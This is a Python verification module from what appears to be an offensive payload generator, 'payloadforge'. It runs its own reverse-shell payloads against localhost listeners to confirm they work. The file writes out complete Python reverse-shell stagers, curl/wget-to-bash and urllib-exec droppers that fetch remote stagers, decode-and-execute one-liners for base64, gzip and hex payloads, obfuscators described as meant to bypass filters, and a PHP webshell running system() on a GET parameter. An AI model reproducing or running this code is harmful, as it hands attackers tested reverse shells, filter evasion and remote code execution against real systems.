"""End-to-end verification for every testable feature.

Each command in this module:
  1. Spawns a listener (and HTTP server if needed) on 127.0.0.1
  2. Generates a payload with the feature applied
  3. Runs the payload as a subprocess
  4. Checks whether the listener accepted a connection
  5. Reports PASS / FAIL / SKIP

Run `verify` for all of them, or individual commands for one area.
"""

import shutil
import socket as _sock
import subprocess
import tempfile
import threading
import time
from pathlib import Path

from payloadforge.commands.registry import register
from payloadforge.encoders import ENCODERS, encode
from payloadforge.obfuscators import OBFUSCATORS, obfuscate
from payloadforge.listener import TCPListener, TLSListener, HTTPServer
from payloadforge.payloads import render
from payloadforge.state import Session
from payloadforge.ui.output import console, ok, fail, warn, info, dedsec_table
from payloadforge.ui.palette import PALETTE


# ============================================================
# Helpers
# ============================================================

def _write_and_spawn_bash(script: str, delay: float = 0.3) -> None:
    """Write script to a temp .sh file, run it after a delay."""
    tmp = Path(tempfile.mkstemp(suffix=".sh")[1])
    tmp.write_text(script)
    tmp.chmod(0o755)
    time.sleep(delay)
    try:
        subprocess.Popen(
            ["bash", str(tmp)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception:
        pass


def _spawn_bash(script: str, delay: float = 0.3) -> None:
    threading.Thread(
        target=_write_and_spawn_bash, args=(script, delay), daemon=True
    ).start()


def _spawn_pwsh(script: str, delay: float = 0.3) -> None:
    def run():
        tmp = Path(tempfile.mkstemp(suffix=".ps1")[1])
        tmp.write_text(script)
        time.sleep(delay)
        try:
            subprocess.Popen(
                ["pwsh", "-NoProfile", "-File", str(tmp)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
        except Exception:
            pass
    threading.Thread(target=run, daemon=True).start()


def _wait_for_connection(port: int, timeout: float = 10.0) -> tuple[bool, str]:
    """Listen on 127.0.0.1:port and wait for a connection. Returns (ok, note)."""
    listener = TCPListener("127.0.0.1", port, timeout=timeout)
    if not listener.start():
        return False, "listener bind failed"

    try:
        assert listener._server
        listener._server.settimeout(timeout)
        client, addr = listener._server.accept()
        try:
            client.settimeout(2.0)
            client.sendall(b"echo PF_VERIFY_OK\r\n")
            time.sleep(0.4)
            data = client.recv(4096)
            live = b"PF_VERIFY_OK" in data
        except Exception:
            live = False
        client.close()
        listener.close()
        return True, "shell live" if live else "connected (no echo)"
    except _sock.timeout:
        listener.close()
        return False, "no connection"
    except Exception as e:
        listener.close()
        return False, str(e)


def _summary(title: str, results: dict[str, tuple[str, str]]) -> None:
    console.print()
    console.print(f"[bold {PALETTE['primary']}]═══════ {title} ═══════[/]")

    t = dedsec_table(title, [
        ("Name", {"style": PALETTE["accent"]}),
        ("Status", {"justify": "center", "width": 8}),
        ("Note", {"style": PALETTE["dim"]}),
    ])
    passed = failed = skipped = 0
    for name, (status, note) in sorted(results.items()):
        if status == "PASS":
            passed += 1
            t.add_row(name, f"[{PALETTE['secondary']}]PASS[/]", note)
        elif status == "FAIL":
            failed += 1
            t.add_row(name, f"[{PALETTE['danger']}]FAIL[/]", note)
        else:
            skipped += 1
            t.add_row(name, f"[{PALETTE['warning']}]SKIP[/]", note)
    console.print(t)
    console.print(
        f"[bold]Total: {len(results)}  |  "
        f"[{PALETTE['secondary']}]Passed: {passed}[/]  |  "
        f"[{PALETTE['danger']}]Failed: {failed}[/]  |  "
        f"[{PALETTE['warning']}]Skipped: {skipped}[/][/]"
    )
    console.print()


# ============================================================
# Encoders
# ============================================================

def _decoder_command(encoder: str, encoded: str) -> str | None:
    """Build a shell command that decodes `encoded` and runs the result."""
    if encoder in ("base64", "base64_nl"):
        return f"echo '{encoded}' | base64 -d | bash"
    if encoder == "gzip_b64":
        return f"echo '{encoded}' | base64 -d | gunzip | bash"
    if encoder == "rev":
        return f"echo '{encoded}' | rev | bash"
    if encoder == "hex":
        return f"printf '%b' '{encoded}' | bash"
    if encoder == "url":
        py = (
            "import urllib.parse,sys;"
            f"sys.stdout.write(urllib.parse.unquote('{encoded}'))"
        )
        return f"python3 -c \"{py}\" | bash"
    if encoder == "utf16le_b64":
        return None  # PowerShell only
    return None


@register(
    "testencoders",
    "Verify every encoder produces a runnable payload.",
    category="listener",
)
def cmd_testencoders(s: Session, args: list[str]) -> None:
    console.print()
    console.print(f"[bold {PALETTE['primary']}]Verifying encoders on 127.0.0.1[/]")

    has_pwsh = shutil.which("pwsh") is not None
    results: dict[str, tuple[str, str]] = {}
    port_base = 4600

    for i, encoder_name in enumerate(sorted(ENCODERS.keys())):
        port = port_base + i

        if encoder_name == "utf16le_b64":
            if not has_pwsh:
                results[encoder_name] = ("SKIP", "needs pwsh")
                continue
            raw = render("powershell_tcp", "127.0.0.1", port)
            encoded = encode(encoder_name, raw)
            # PowerShell -EncodedCommand expects exactly this encoding
            script = f"pwsh -NoProfile -EncodedCommand {encoded}"
            _spawn_bash(script)
            okk, note = _wait_for_connection(port, timeout=10.0)
            results[encoder_name] = ("PASS" if okk else "FAIL", note)
            continue

        raw = render("bash_tcp", "127.0.0.1", port)
        encoded = encode(encoder_name, raw)
        decoder = _decoder_command(encoder_name, encoded)

        if decoder is None:
            results[encoder_name] = ("SKIP", "no shell decoder defined")
            continue

        _spawn_bash(decoder)
        okk, note = _wait_for_connection(port, timeout=10.0)
        results[encoder_name] = ("PASS" if okk else "FAIL", note)

    _summary("Encoders", results)


# ============================================================
# Obfuscators
# ============================================================

_OBF_TARGETS: dict[str, tuple[str, str]] = {
    "vars_bash":            ("bash_tcp",       "bash"),
    "split_strings_bash":   ("bash_tcp",       "bash"),
    "vars_python":          ("python3",        "bash"),
    "split_strings_python": ("python3",        "bash"),
    "double_b64":           ("bash_tcp",       "bash"),
    "ps_case_flip":         ("powershell_tcp", "pwsh"),
    "ps_backticks":         ("powershell_tcp", "pwsh"),
    "split_strings_ps":     ("powershell_tcp", "pwsh"),
    "ps_concat_chain":      ("powershell_tcp", "pwsh"),
}


@register(
    "testobfuscators",
    "Verify each obfuscator preserves payload semantics.",
    category="listener",
)
def cmd_testobfuscators(s: Session, args: list[str]) -> None:
    console.print()
    console.print(f"[bold {PALETTE['primary']}]Verifying obfuscators on 127.0.0.1[/]")

    has_pwsh = shutil.which("pwsh") is not None
    results: dict[str, tuple[str, str]] = {}
    port_base = 4700

    for i, (obf_name, (payload_name, runner)) in enumerate(sorted(_OBF_TARGETS.items())):
        port = port_base + i

        if runner == "pwsh" and not has_pwsh:
            results[obf_name] = ("SKIP", "needs pwsh")
            continue

        raw = render(payload_name, "127.0.0.1", port)

        try:
            obfuscated = obfuscate(obf_name, raw)
        except Exception as e:
            results[obf_name] = ("FAIL", f"obfuscate error: {e}")
            continue

        # Build the runnable command. Some obfuscators produce output that
        # needs to be decoded first (they're meant to bypass a filter that
        # decodes once); we decode here so the payload reaches the shell.
        if runner == "pwsh":
            _spawn_pwsh(obfuscated)
        elif obf_name == "double_b64":
            decoder = f"echo '{obfuscated}' | base64 -d | base64 -d | bash"
            _spawn_bash(decoder)
        else:
            _spawn_bash(obfuscated)

        okk, note = _wait_for_connection(port, timeout=10.0)
        results[obf_name] = ("PASS" if okk else "FAIL", note)

    _summary("Obfuscators", results)

# ============================================================
# TLS listener
# ============================================================

@register(
    "testtls",
    "Verify the TLS listener accepts a real handshake.",
    category="listener",
)
def cmd_testtls(s: Session, args: list[str]) -> None:
    if not shutil.which("openssl"):
        fail("openssl not installed")
        return

    port = 4900
    console.print()
    console.print(f"[bold {PALETTE['primary']}]Verifying TLS listener on 127.0.0.1:{port}[/]")

    listener = TLSListener("127.0.0.1", port, timeout=8.0)
    if not listener.start():
        fail("TLS listener failed to bind")
        return

    result = {"ok": False, "note": "no handshake"}

    def run_accept():
        try:
            r = listener.accept()
            result["ok"] = r
            result["note"] = "handshake completed" if r else "handshake failed"
        except Exception as e:
            result["note"] = str(e)

    t = threading.Thread(target=run_accept, daemon=True)
    t.start()

    time.sleep(0.5)

    try:
        subprocess.run(
            ["openssl", "s_client", "-connect", f"127.0.0.1:{port}",
             "-quiet", "-verify_quiet"],
            input=b"hello\n",
            capture_output=True,
            timeout=5,
        )
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        result["note"] = str(e)

    t.join(timeout=5)

    if result["ok"]:
        ok(f"TLS listener: {result['note']}")
    else:
        fail(f"TLS listener: {result['note']}")

    console.print()


# ============================================================
# Chain droppers
# ============================================================

_CHAIN_SCRIPTS = {
    "chain_bash_curl":  "curl -s http://{lhost}:{http_port}/stager.sh | bash",
    "chain_bash_wget":  "wget -qO- http://{lhost}:{http_port}/stager.sh | bash",
    "chain_python":     (
        "python3 -c 'import urllib.request;"
        "exec(urllib.request.urlopen(\"http://{lhost}:{http_port}/stager.py\").read())'"
    ),
    "chain_curl_exec":  (
        "curl -s http://{lhost}:{http_port}/p -o /tmp/pf_p && "
        "chmod +x /tmp/pf_p && /tmp/pf_p"
    ),
}


@register(
    "testchain",
    "Verify chain droppers with a live HTTP server + listener.",
    category="listener",
)
def cmd_testchain(s: Session, args: list[str]) -> None:
    console.print()
    console.print(f"[bold {PALETTE['primary']}]Verifying chain droppers[/]")

    results: dict[str, tuple[str, str]] = {}
    port_base = 8100  # HTTP ports

    for i, (chain_name, chain_tpl) in enumerate(sorted(_CHAIN_SCRIPTS.items())):
        http_port = port_base + i
        listen_port = 5100 + i

        with tempfile.TemporaryDirectory() as docroot:
            # Build stager: python3 reverse shell as stager.sh (or .py for chain_python)
            if chain_name == "chain_python":
                stager_name = "stager.py"
                stager_code = (
                    "import socket,subprocess,os;"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    f"s.connect(('127.0.0.1',{listen_port}));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call(['/bin/sh','-i'])"
                )
            elif chain_name == "chain_curl_exec":
                stager_name = "p"
                stager_code = (
                    "#!/bin/bash\n"
                    "python3 -c 'import socket,subprocess,os;"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    f"s.connect((\"127.0.0.1\",{listen_port}));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'\n"
                )
            else:
                stager_name = "stager.sh"
                stager_code = (
                    "python3 -c 'import socket,subprocess,os;"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    f"s.connect((\"127.0.0.1\",{listen_port}));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'\n"
                )

            stager_path = Path(docroot) / stager_name
            stager_path.write_text(stager_code)
            if chain_name == "chain_curl_exec":
                stager_path.chmod(0o755)

            http = HTTPServer("127.0.0.1", http_port, docroot=docroot)
            if not http.start():
                results[chain_name] = ("FAIL", "HTTP bind failed")
                continue

            # Build the chain payload command
            cmd_str = chain_tpl.format(lhost="127.0.0.1", http_port=http_port)

            _spawn_bash(cmd_str)
            okk, note = _wait_for_connection(listen_port, timeout=10.0)
            results[chain_name] = ("PASS" if okk else "FAIL", note)

            http.stop()

    _summary("Chain droppers", results)


# ============================================================
# PHP web payloads
# ============================================================

@register(
    "testweb",
    "Verify PHP web payloads against a local php -S server.",
    category="listener",
)
def cmd_testweb(s: Session, args: list[str]) -> None:
    if not shutil.which("php"):
        warn("php not installed — skipping web tests")
        info("Install with: sudo pacman -S php   (or apt/dnf equivalent)")
        return

    if not shutil.which("curl"):
        warn("curl not installed — cannot run web tests")
        return

    console.print()
    console.print(f"[bold {PALETTE['primary']}]Verifying PHP web payloads[/]")

    results: dict[str, tuple[str, str]] = {}

    with tempfile.TemporaryDirectory() as webroot:
        # PHP webshell
        shell = Path(webroot) / "shell.php"
        shell.write_text("<?php if(isset($_GET['c'])){ system($_GET['c']); } ?>")

        port = 8901
        proc = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}", "-t", webroot],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(1.2)

        try:
            r = subprocess.run(
                ["curl", "-s",
                 f"http://127.0.0.1:{port}/shell.php?c=echo%20PF_VERIFY_OK"],
                capture_output=True, text=True, timeout=5,
            )
            live = "PF_VERIFY_OK" in r.stdout
            results["php_cmd_shell"] = (
                ("PASS", "echoed marker") if live else ("FAIL", "no marker in output")
            )
        except Exception as e:
            results["php_cmd_shell"] = ("FAIL", str(e))
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()

    _summary("PHP web payloads", results)


# ============================================================
# All-in-one
# ============================================================

@register(
    "verify",
    "Run every verification: encoders, obfuscators, TLS, chain, web.",
    category="listener",
)
def cmd_verify(s: Session, args: list[str]) -> None:
    console.print()
    console.print(
        f"[bold {PALETTE['primary']}]╔══════════════════════════════════════╗[/]"
    )
    console.print(
        f"[bold {PALETTE['primary']}]║   FULL VERIFICATION — 127.0.0.1       ║[/]"
    )
    console.print(
        f"[bold {PALETTE['primary']}]╚══════════════════════════════════════╝[/]"
    )

    cmd_testencoders(s, [])
    cmd_testobfuscators(s, [])
    cmd_testtls(s, [])
    cmd_testchain(s, [])
    cmd_testweb(s, [])

    console.print()
    console.print(
        f"[bold {PALETTE['secondary']}]Verification complete. "
        f"All PASS rows mean the feature works end-to-end.[/]"
    )
    console.print()
